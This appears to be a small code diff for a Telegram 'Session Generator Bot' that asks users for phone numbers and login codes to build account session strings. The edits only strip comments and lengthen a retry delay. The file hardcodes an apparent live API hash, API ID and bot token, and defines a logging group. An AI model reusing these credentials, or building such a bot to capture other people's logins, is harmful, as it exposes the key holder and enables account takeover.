@@ -1,4 +1,4 @@
-from telethon import TelegramClient, events, Button  # Add 'Button' import here
+from telethon import TelegramClient, events, Button
 from pyrogram import Client as PyroClient
 from telethon.sessions import StringSession
 import time
@@ -8,8 +8,7 @@ from telethon.errors import PhoneCodeExpiredError
 API_ID = 28795512
 API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
 BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
-LOGGER_GROUP_ID = "-1002477750706"  # Set the appropriate group ID for logging
-
+LOGGER_GROUP_ID = "-1002477750706"
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
@@ -17,7 +16,7 @@ bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 user_sessions = {}
 
 # ✅ /start Command
-@bot.on(events.NewMessage(pattern="/start"))  # This listens for the '/start' command
+@bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
     await event.respond(
         "**👋 Welcome to Session Generator Bot!**\n\n"
@@ -102,7 +101,7 @@ async def process_input(event):
                     sent_code = await client.send_code(phone_number)
                     user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Update phone_code_hash
                     await event.respond("🔹 **New OTP sent. Please enter the code again.**")
-                    time.sleep(2)  # Add delay between OTP retries
+                    time.sleep(5)  # Increased retry delay (5 seconds)
                 else:
                     await event.respond("❌ **Error:** The OTP expired multiple times. Please try again later.")
                     del user_sessions[user_id]  # Remove session if failed after retries
